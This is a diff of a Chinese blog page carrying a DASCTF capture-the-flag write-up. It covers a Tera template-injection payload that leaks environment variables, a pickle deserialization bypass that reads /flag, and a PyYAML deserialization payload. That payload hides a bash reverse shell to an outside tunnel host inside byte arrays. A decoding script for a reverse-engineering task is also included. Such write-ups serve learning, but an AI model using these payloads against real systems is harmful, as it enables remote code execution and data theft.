@@ -6,7 +6,7 @@
 
 <link rel='canonical' href='https://Oight.github.io/p/dasctf/'>
 
-<link rel="stylesheet" href="/scss/style.min.0e9b0dc41309ee439f307e94fe233ae09b70f32858267ed1afae44d0ba448205.css"><meta property='og:title' content="DASCTF">
+<link rel="stylesheet" href="/scss/style.min.cfe2632a91c7cb600e0badeaecd0da79bddaa315643726e117b52f62c13fe88c.css"><meta property='og:title' content="DASCTF">
 <meta property='og:description' content="Chicken\r1.签到题\r进入容器发现会先在https://game.wetolink.com/停留一段时间然后会跳转到https://game.gcsis.cn/compete/home/8c3adb14b154482\n">
 <meta property='og:url' content='https://Oight.github.io/p/dasctf/'>
 <meta property='og:site_name' content='Oight'>
@@ -376,39 +376,18 @@
 <p>在FLAG兑换区域输入”81“,返回“81”说明存在SSTI</p>
 <p>由题可知，这道题是RUST写的。查询资料得知RUST中常见的WEB模板有：</p>
 <p>Tera</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Tera 是Rust中一个高性能的模板引擎，类似于Jinja2（Python）和Liquid（Ruby）。它支持复杂的模板功能，但如果输入没有得到适当的验证，攻击者可能会通过注入模板代码来触发SSTI漏洞。
-</span></span></code></pre></td></tr></table>
-</div>
-</div><blockquote>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Tera 是Rust中一个高性能的模板引擎，类似于Jinja2（Python）和Liquid（Ruby）。它支持复杂的模板功能，但如果输入没有得到适当的验证，攻击者可能会通过注入模板代码来触发SSTI漏洞。
+</span></span></code></pre></div><blockquote>
 <p><a class="link" href="https://github.com/Keats/tera"  target="_blank" rel="noopener"
     >Tera GitHub</a></p></blockquote>
 <p>Askama</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Askama 是另一个Rust模板引擎，采用编译时模板渲染。它是基于Rust的类型系统，模板是在编译时进行检查的，这意味着在某些情况下可以避免SSTI攻击，因其不允许任意的动态代码执行。
-</span></span></code></pre></td></tr></table>
-</div>
-</div><blockquote>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Askama 是另一个Rust模板引擎，采用编译时模板渲染。它是基于Rust的类型系统，模板是在编译时进行检查的，这意味着在某些情况下可以避免SSTI攻击，因其不允许任意的动态代码执行。
+</span></span></code></pre></div><blockquote>
 <p><a class="link" href="https://github.com/rinja-rs/askama"  target="_blank" rel="noopener"
     >Askama GitHub</a></p></blockquote>
 <p>Handlebars</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Handlebars 是一个流行的模板引擎，Rust中的实现通常为 handlebars-rust。与其他模板引擎一样，如果不当使用，也可能导致SSTI漏洞。
-</span></span></code></pre></td></tr></table>
-</div>
-</div><blockquote>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Handlebars 是一个流行的模板引擎，Rust中的实现通常为 handlebars-rust。与其他模板引擎一样，如果不当使用，也可能导致SSTI漏洞。
+</span></span></code></pre></div><blockquote>
 <p><a class="link" href="https://github.com/sunng87/handlebars-rust"  target="_blank" rel="noopener"
     >Handlebars GitHub</a></p></blockquote>
 <p>查询得知这道题使用Tera模板</p>
@@ -416,139 +395,21 @@
 <p><a class="link" href="https://brycec.me/posts/corctf_2023_challenges"  target="_blank" rel="noopener"
     >Tera的SSTI</a></p></blockquote>
 <p>在其中有</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span><span class="lnt">3
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">So</span><span class="p">,</span> <span class="n">the</span> <span class="n">session</span> <span class="n">store</span> <span class="n">used</span> <span class="n">by</span> <span class="n">the</span> <span class="n">application</span> <span class="n">is</span> <span class="n">a</span> <span class="n">CookieStore</span><span class="p">,</span> <span class="n">where</span> <span class="n">the</span> <span class="n">secret</span> <span class="n">used</span> <span class="n">comes</span> <span class="n">from</span> <span class="n">the</span> <span class="n">SECRET</span> <span class="n">environment</span> <span class="n">variable</span><span class="o">!</span> <span class="n">So</span><span class="p">,</span> <span class="k">if</span> <span class="n">we</span> <span class="n">can</span> <span class="n">leak</span> <span class="n">the</span> <span class="n">SECRET</span> <span class="n">env</span> <span class="k">var</span><span class="p">,</span> <span class="n">we</span> <span class="n">could</span> <span class="nb">sign</span> <span class="n">our</span> <span class="n">own</span> <span class="n">sessions</span> <span class="n">with</span> <span class="n">arbitrary</span> <span class="n">data</span> <span class="p">(</span><span class="n">since</span> <span class="n">the</span> <span class="n">complete</span> <span class="n">session</span> <span class="n">data</span> <span class="n">is</span> <span class="n">stored</span> <span class="ow">in</span> <span class="n">the</span> <span class="n">cookie</span><span class="p">)</span><span class="o">.</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">So</span><span class="p">,</span> <span class="n">the</span> <span class="n">session</span> <span class="n">store</span> <span class="n">used</span> <span class="n">by</span> <span class="n">the</span> <span class="n">application</span> <span class="n">is</span> <span class="n">a</span> <span class="n">CookieStore</span><span class="p">,</span> <span class="n">where</span> <span class="n">the</span> <span class="n">secret</span> <span class="n">used</span> <span class="n">comes</span> <span class="n">from</span> <span class="n">the</span> <span class="n">SECRET</span> <span class="n">environment</span> <span class="n">variable</span><span class="o">!</span> <span class="n">So</span><span class="p">,</span> <span class="k">if</span> <span class="n">we</span> <span class="n">can</span> <span class="n">leak</span> <span class="n">the</span> <span class="n">SECRET</span> <span class="n">env</span> <span class="k">var</span><span class="p">,</span> <span class="n">we</span> <span class="n">could</span> <span class="nb">sign</span> <span class="n">our</span> <span class="n">own</span> <span class="n">sessions</span> <span class="n">with</span> <span class="n">arbitrary</span> <span class="n">data</span> <span class="p">(</span><span class="n">since</span> <span class="n">the</span> <span class="n">complete</span> <span class="n">session</span> <span class="n">data</span> <span class="n">is</span> <span class="n">stored</span> <span class="ow">in</span> <span class="n">the</span> <span class="n">cookie</span><span class="p">)</span><span class="o">.</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="n">Okay</span><span class="p">,</span> <span class="n">let</span><span class="s1">&#39;s do this. Following Tera&#39;</span><span class="n">s</span> <span class="n">format</span><span class="p">,</span> <span class="n">we</span> <span class="n">can</span> <span class="n">leak</span> <span class="n">the</span> <span class="n">session</span> <span class="n">with</span> <span class="p">{{</span> <span class="n">get_env</span><span class="p">(</span><span class="n">name</span><span class="o">=</span><span class="s2">&#34;SECRET&#34;</span><span class="p">)</span> <span class="p">}}:</span>
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>可以发现这道题也是没法RCE但可以泄露环境变量，但显然CORCTF中的这道题更难（毕竟DASCTF中的这道签到题只是其中的一个知识点）</p>
+</span></span></code></pre></div><p>可以发现这道题也是没法RCE但可以泄露环境变量，但显然CORCTF中的这道题更难（毕竟DASCTF中的这道签到题只是其中的一个知识点）</p>
 <p>所以我们知道在Tera 中利用SSTI读取环境变量可以使用 <em>get_env</em> 这个内置函数，其格式为：</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">{{ get_env(name=&#34;SECRET&#34;) }}
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>我们要读FLAG的内容，所以payload为</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">{{ get_env(name=&#34;FLAG&#34;) }}  
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>得到flag</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">{{ get_env(name=&#34;SECRET&#34;) }}
+</span></span></code></pre></div><p>我们要读FLAG的内容，所以payload为</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">{{ get_env(name=&#34;FLAG&#34;) }}  
+</span></span></code></pre></div><p>得到flag</p>
 <h1 id="web">WEB
 </h1><h2 id="const_python">const_python
 </h2><p>有一说一，这次 const_python 和 yaml_matser 两道WEB题都没回显，第一次做这样的题，所以很不适应</p>
 <p>hint提示在 /src 中可以读到源码，进入其中直接得到一部分源码，还有一部分源码藏在HTML注释里，源码是用Python写的</p>
 <p>源码如下：</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
-</span><span class="lnt"> 2
-</span><span class="lnt"> 3
-</span><span class="lnt"> 4
-</span><span class="lnt"> 5
-</span><span class="lnt"> 6
-</span><span class="lnt"> 7
-</span><span class="lnt"> 8
-</span><span class="lnt"> 9
-</span><span class="lnt">10
-</span><span class="lnt">11
-</span><span class="lnt">12
-</span><span class="lnt">13
-</span><span class="lnt">14
-</span><span class="lnt">15
-</span><span class="lnt">16
-</span><span class="lnt">17
-</span><span class="lnt">18
-</span><span class="lnt">19
-</span><span class="lnt">20
-</span><span class="lnt">21
-</span><span class="lnt">22
-</span><span class="lnt">23
-</span><span class="lnt">24
-</span><span class="lnt">25
-</span><span class="lnt">26
-</span><span class="lnt">27
-</span><span class="lnt">28
-</span><span class="lnt">29
-</span><span class="lnt">30
-</span><span class="lnt">31
-</span><span class="lnt">32
-</span><span class="lnt">33
-</span><span class="lnt">34
-</span><span class="lnt">35
-</span><span class="lnt">36
-</span><span class="lnt">37
-</span><span class="lnt">38
-</span><span class="lnt">39
-</span><span class="lnt">40
-</span><span class="lnt">41
-</span><span class="lnt">42
-</span><span class="lnt">43
-</span><span class="lnt">44
-</span><span class="lnt">45
-</span><span class="lnt">46
-</span><span class="lnt">47
-</span><span class="lnt">48
-</span><span class="lnt">49
-</span><span class="lnt">50
-</span><span class="lnt">51
-</span><span class="lnt">52
-</span><span class="lnt">53
-</span><span class="lnt">54
-</span><span class="lnt">55
-</span><span class="lnt">56
-</span><span class="lnt">57
-</span><span class="lnt">58
-</span><span class="lnt">59
-</span><span class="lnt">60
-</span><span class="lnt">61
-</span><span class="lnt">62
-</span><span class="lnt">63
-</span><span class="lnt">64
-</span><span class="lnt">65
-</span><span class="lnt">66
-</span><span class="lnt">67
-</span><span class="lnt">68
-</span><span class="lnt">69
-</span><span class="lnt">70
-</span><span class="lnt">71
-</span><span class="lnt">72
-</span><span class="lnt">73
-</span><span class="lnt">74
-</span><span class="lnt">75
-</span><span class="lnt">76
-</span><span class="lnt">77
-</span><span class="lnt">78
-</span><span class="lnt">79
-</span><span class="lnt">80
-</span><span class="lnt">81
-</span><span class="lnt">82
-</span><span class="lnt">83
-</span><span class="lnt">84
-</span><span class="lnt">85
-</span><span class="lnt">86
-</span><span class="lnt">87
-</span><span class="lnt">88
-</span><span class="lnt">89
-</span><span class="lnt">90
-</span><span class="lnt">91
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">plaintext</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">plaintext</span>
 </span></span><span class="line"><span class="cl"><span class="n">import</span> <span class="n">builtins</span>
 </span></span><span class="line"><span class="cl"><span class="n">import</span> <span class="n">io</span>
 </span></span><span class="line"><span class="cl"><span class="n">import</span> <span class="n">sys</span>
@@ -639,36 +500,12 @@
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
 </span></span><span class="line"><span class="cl">    <span class="n">app</span><span class="o">.</span><span class="n">run</span><span class="p">(</span><span class="n">host</span><span class="o">=</span><span class="s1">&#39;0.0.0.0&#39;</span><span class="p">,</span> <span class="n">debug</span><span class="o">=</span><span class="n">False</span><span class="p">,</span> <span class="n">port</span><span class="o">=</span><span class="mi">5000</span><span class="p">)</span>
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>发现一共三个路由， /src、/ppicklee 和 /admin</p>
+</span></span></code></pre></div><p>发现一共三个路由， /src、/ppicklee 和 /admin</p>
 <p>进入/admin 路由中提示没有权限，以为是要通过更改SESSID获取管理员权限，来得到flag
 但是这道题三个路由中都没有Cooike，无法成功</p>
 <p>再读源码，发现可以/ppicklee 路由中存在防火墙，所以绕过防火墙，看看能否从 /ppicklee 路由中得到什么
 使用</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
-</span><span class="lnt"> 2
-</span><span class="lnt"> 3
-</span><span class="lnt"> 4
-</span><span class="lnt"> 5
-</span><span class="lnt"> 6
-</span><span class="lnt"> 7
-</span><span class="lnt"> 8
-</span><span class="lnt"> 9
-</span><span class="lnt">10
-</span><span class="lnt">11
-</span><span class="lnt">12
-</span><span class="lnt">13
-</span><span class="lnt">14
-</span><span class="lnt">15
-</span><span class="lnt">16
-</span><span class="lnt">17
-</span><span class="lnt">18
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">import pickle
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">import pickle
 </span></span><span class="line"><span class="cl">import base64
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"># 使用 subprocess 来绕过
@@ -686,30 +523,14 @@
 </span></span><span class="line"><span class="cl">encoded_data = base64.b64encode(pickled_data).decode()
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl">print(encoded_data)
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>使用POSTman传参，发现只能得到 success pickle
+</span></span></code></pre></div><p>使用POSTman传参，发现只能得到 success pickle
 无法得到flag，遂放弃</p>
 <p>后由WP可知，因为 src 路由会读取 app.py 内容并输出，所以可以尝试先读取flag，再把flag的内容写入到 app.py</p>
 <p>可以使用pker：</p>
 <blockquote>
 <p><a class="link" href="https://github.com/eddieivan01/pker"  target="_blank" rel="noopener"
     >Pker</a></p></blockquote>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
-</span><span class="lnt"> 2
-</span><span class="lnt"> 3
-</span><span class="lnt"> 4
-</span><span class="lnt"> 5
-</span><span class="lnt"> 6
-</span><span class="lnt"> 7
-</span><span class="lnt"> 8
-</span><span class="lnt"> 9
-</span><span class="lnt">10
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">getattr = GLOBAL(&#39;builtins&#39;, &#39;getattr&#39;)
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">getattr = GLOBAL(&#39;builtins&#39;, &#39;getattr&#39;)
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl">open = GLOBAL(&#39;builtins&#39;, &#39;open&#39;)
 </span></span><span class="line"><span class="cl">flag=open(&#39;/flag&#39;)
@@ -719,100 +540,14 @@
 </span></span><span class="line"><span class="cl">fff=read()
 </span></span><span class="line"><span class="cl">write(fff)
 </span></span><span class="line"><span class="cl">return  
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>在 ppicklee 路由中传参，然后在 src 路由中得到flag</p>
+</span></span></code></pre></div><p>在 ppicklee 路由中传参，然后在 src 路由中得到flag</p>
 <p>这道题涉及pickle反序列化，在这里粘一个pickle反序列化相关的博客</p>
 <blockquote>
 <p><a class="link" href="https://hachp1.github.io/posts/Web%e5%ae%89%e5%85%a8/20200328-pickle.html"  target="_blank" rel="noopener"
     >Pickle反序列化初探</a></p></blockquote>
 <h2 id="yaml_matser">yaml_matser
 </h2><p>源码：</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
-</span><span class="lnt"> 2
-</span><span class="lnt"> 3
-</span><span class="lnt"> 4
-</span><span class="lnt"> 5
-</span><span class="lnt"> 6
-</span><span class="lnt"> 7
-</span><span class="lnt"> 8
-</span><span class="lnt"> 9
-</span><span class="lnt">10
-</span><span class="lnt">11
-</span><span class="lnt">12
-</span><span class="lnt">13
-</span><span class="lnt">14
-</span><span class="lnt">15
-</span><span class="lnt">16
-</span><span class="lnt">17
-</span><span class="lnt">18
-</span><span class="lnt">19
-</span><span class="lnt">20
-</span><span class="lnt">21
-</span><span class="lnt">22
-</span><span class="lnt">23
-</span><span class="lnt">24
-</span><span class="lnt">25
-</span><span class="lnt">26
-</span><span class="lnt">27
-</span><span class="lnt">28
-</span><span class="lnt">29
-</span><span class="lnt">30
-</span><span class="lnt">31
-</span><span class="lnt">32
-</span><span class="lnt">33
-</span><span class="lnt">34
-</span><span class="lnt">35
-</span><span class="lnt">36
-</span><span class="lnt">37
-</span><span class="lnt">38
-</span><span class="lnt">39
-</span><span class="lnt">40
-</span><span class="lnt">41
-</span><span class="lnt">42
-</span><span class="lnt">43
-</span><span class="lnt">44
-</span><span class="lnt">45
-</span><span class="lnt">46
-</span><span class="lnt">47
-</span><span class="lnt">48
-</span><span class="lnt">49
-</span><span class="lnt">50
-</span><span class="lnt">51
-</span><span class="lnt">52
-</span><span class="lnt">53
-</span><span class="lnt">54
-</span><span class="lnt">55
-</span><span class="lnt">56
-</span><span class="lnt">57
-</span><span class="lnt">58
-</span><span class="lnt">59
-</span><span class="lnt">60
-</span><span class="lnt">61
-</span><span class="lnt">62
-</span><span class="lnt">63
-</span><span class="lnt">64
-</span><span class="lnt">65
-</span><span class="lnt">66
-</span><span class="lnt">67
-</span><span class="lnt">68
-</span><span class="lnt">69
-</span><span class="lnt">70
-</span><span class="lnt">71
-</span><span class="lnt">72
-</span><span class="lnt">73
-</span><span class="lnt">74
-</span><span class="lnt">75
-</span><span class="lnt">76
-</span><span class="lnt">77
-</span><span class="lnt">78
-</span><span class="lnt">79
-</span><span class="lnt">80
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">plaintext</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">plaintext</span>
 </span></span><span class="line"><span class="cl"><span class="n">import</span> <span class="n">os</span>
 </span></span><span class="line"><span class="cl"><span class="n">import</span> <span class="n">re</span>
 </span></span><span class="line"><span class="cl"><span class="n">import</span> <span class="n">yaml</span>
@@ -892,52 +627,27 @@
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
 </span></span><span class="line"><span class="cl">    <span class="n">app</span><span class="o">.</span><span class="n">run</span><span class="p">()</span>
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>进入发现有文件上传功能，而且只能上传 .yaml 文件</p>
+</span></span></code></pre></div><p>进入发现有文件上传功能，而且只能上传 .yaml 文件</p>
 <p>一开始尝试直接输出flag，使用</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span><span class="lnt">3
-</span><span class="lnt">4
-</span><span class="lnt">5
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">!!python/object:__main__.MyClass
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">!!python/object:__main__.MyClass
 </span></span><span class="line"><span class="cl">args: !!python/tuple
 </span></span><span class="line"><span class="cl">- !!python/name:globals
 </span></span><span class="line"><span class="cl">- &#34;os.system&#34;
 </span></span><span class="line"><span class="cl">- &#34;echo hello&#34;
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>无果</p>
+</span></span></code></pre></div><p>无果</p>
 <p>由WP得知这是一道pyYaml反序列化</p>
 <blockquote>
 <p><a class="link" href="https://xz.aliyun.com/t/12481?time__1311=GqGxRQqiuDyDlrzG78GODc7x9GLPQAox"  target="_blank" rel="noopener"
     >PyYaml反序列化漏洞详解</a></p></blockquote>
 <p>黑名单中采用了列举法来防止攻击，可以从这里入手，发现没有禁exec</p>
 <p>上传内容：</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span><span class="lnt">3
-</span><span class="lnt">4
-</span><span class="lnt">5
-</span><span class="lnt">6
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">!!python/object/new:type
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">!!python/object/new:type
 </span></span><span class="line"><span class="cl">args: [&#39;z&#39;, !!python/tuple [], {&#39;extend&#39;: !!python/name:exec }]
 </span></span><span class="line"><span class="cl">listitems: &#39;__import__(bytes([111,115]).decode()).__getattribute__(bytes([115,121,115,116,101,109]).decode())(bytes([98, 97, 115, 104, 32, 45, 105, 32, 62, 38, 32, 47, 100, 101, 118, 47, 116, 99, 112, 47, 51, 49, 46, 116, 99, 112, 46, 99, 112, 111, 108, 97, 114, 46, 116, 111, 112, 32, 49, 51, 49, 57, 48, 32, 48, 62, 38, 49]
 </span></span><span class="line"><span class="cl">).decode())&#39;
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl">#__import__(&#39;os&#39;).__getattribute__(&#39;system&#39;)(&#39;bash -i &gt;&amp; /dev/tcp/31.tcp.cpolar.top 13190  0&gt;&amp;1&#39;)
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>建立反向shell，得到flag</p>
+</span></span></code></pre></div><p>建立反向shell，得到flag</p>
 <h1 id="reverse">Reverse
 </h1><h2 id="tryre">tryre
 </h2><p>根据提供的代码片段，可以看到这是一个混合了 Base64 编码、异或操作和字符映射的加密验证逻辑。我们需要逆向每一步操作来编写解密脚本，以还原原始的输入字符串。
@@ -945,26 +655,12 @@
 解密步骤解析
 1.Base64 映射表(aZyxabcdefghijk)
 自定义的 Base64 字符映射表:</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">ZYXABCDEFGHIJKLMNOPQRSTUVWzyxabcdefghijklmnopqrstuvw0123456789+/
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>加密时使用了这个映射表对数据进行编码，解密时需要反向查找映射。
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">ZYXABCDEFGHIJKLMNOPQRSTUVWzyxabcdefghijklmnopqrstuvw0123456789+/
+</span></span></code></pre></div><p>加密时使用了这个映射表对数据进行编码，解密时需要反向查找映射。
 2.加密数据(v21):
 加密的目标字符串为:</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">M@ASL3MF~uL3ICT2IhUgKSD2IeDsICH7Hd26HhQgKSOhNCX7TVL3UFMeHi2?
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>3.Base64 编码逻辑
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">M@ASL3MF~uL3ICT2IhUgKSD2IeDsICH7Hd26HhQgKSOhNCX7TVL3UFMeHi2?
+</span></span></code></pre></div><p>3.Base64 编码逻辑
 数据被分为 3字节一组，经过位移和分组操作映射到 Base64 表的索引中。
 解密时需要逆向这些位移和组装操作，还原原始的字节序列。</p>
 <p>4.异或操作:
@@ -972,65 +668,7 @@
 解密时需要再次逐字节与 2 进行异或操作，恢复原始数据。</p>
 <p>验证逻辑:解密后的数据与 v21 逐字节对比，如果完全相同，则验证通过</p>
 <p>使用如下脚本进行解码</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
-</span><span class="lnt"> 2
-</span><span class="lnt"> 3
-</span><span class="lnt"> 4
-</span><span class="lnt"> 5
-</span><span class="lnt"> 6
-</span><span class="lnt"> 7
-</span><span class="lnt"> 8
-</span><span class="lnt"> 9
-</span><span class="lnt">10
-</span><span class="lnt">11
-</span><span class="lnt">12
-</span><span class="lnt">13
-</span><span class="lnt">14
-</span><span class="lnt">15
-</span><span class="lnt">16
-</span><span class="lnt">17
-</span><span class="lnt">18
-</span><span class="lnt">19
-</span><span class="lnt">20
-</span><span class="lnt">21
-</span><span class="lnt">22
-</span><span class="lnt">23
-</span><span class="lnt">24
-</span><span class="lnt">25
-</span><span class="lnt">26
-</span><span class="lnt">27
-</span><span class="lnt">28
-</span><span class="lnt">29
-</span><span class="lnt">30
-</span><span class="lnt">31
-</span><span class="lnt">32
-</span><span class="lnt">33
-</span><span class="lnt">34
-</span><span class="lnt">35
-</span><span class="lnt">36
-</span><span class="lnt">37
-</span><span class="lnt">38
-</span><span class="lnt">39
-</span><span class="lnt">40
-</span><span class="lnt">41
-</span><span class="lnt">42
-</span><span class="lnt">43
-</span><span class="lnt">44
-</span><span class="lnt">45
-</span><span class="lnt">46
-</span><span class="lnt">47
-</span><span class="lnt">48
-</span><span class="lnt">49
-</span><span class="lnt">50
-</span><span class="lnt">51
-</span><span class="lnt">52
-</span><span class="lnt">53
-</span><span class="lnt">54
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="c1"># 自定义 Base64 字符映射表</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="c1"># 自定义 Base64 字符映射表</span>
 </span></span><span class="line"><span class="cl"><span class="n">custom_base64</span> <span class="o">=</span> <span class="s2">&#34;ZYXABCDEFGHIJKLMNOPQRSTUVWzyxabcdefghijklmnopqrstuvw0123456789+/&#34;</span>
 </span></span><span class="line"><span class="cl"><span class="n">reverse_base64</span> <span class="o">=</span> <span class="p">{</span><span class="n">char</span><span class="p">:</span> <span class="n">idx</span> <span class="k">for</span> <span class="n">idx</span><span class="p">,</span> <span class="n">char</span> <span class="ow">in</span> <span class="n">enumerate</span><span class="p">(</span><span class="n">custom_base64</span><span class="p">)}</span>
 </span></span><span class="line"><span class="cl">
@@ -1084,9 +722,7 @@
 </span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;解密结果:&#34;</span><span class="p">,</span> <span class="n">decrypted</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl"><span class="n">except</span> <span class="n">Exception</span> <span class="n">as</span> <span class="n">e</span><span class="p">:</span>
 </span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;解密失败:&#34;</span><span class="p">,</span> <span class="n">e</span><span class="p">)</span>
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>运行得到flag</p>
+</span></span></code></pre></div><p>运行得到flag</p>
 <h2 id="secret_of_inkey">secret_of_inkey
 </h2><p>进入发现是小游戏</p>
 <p>可以玩出flag来（bushi）</p>
@@ -1097,79 +733,7 @@
 <h3 id="payautogui">Payautogui
 </h3><p>payautogui是一个Python模块，可以以编程的方式控制键鼠
 使用脚本</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
-</span><span class="lnt"> 2
-</span><span class="lnt"> 3
-</span><span class="lnt"> 4
-</span><span class="lnt"> 5
-</span><span class="lnt"> 6
-</span><span class="lnt"> 7
-</span><span class="lnt"> 8
-</span><span class="lnt"> 9
-</span><span class="lnt">10
-</span><span class="lnt">11
-</span><span class="lnt">12
-</span><span class="lnt">13
-</span><span class="lnt">14
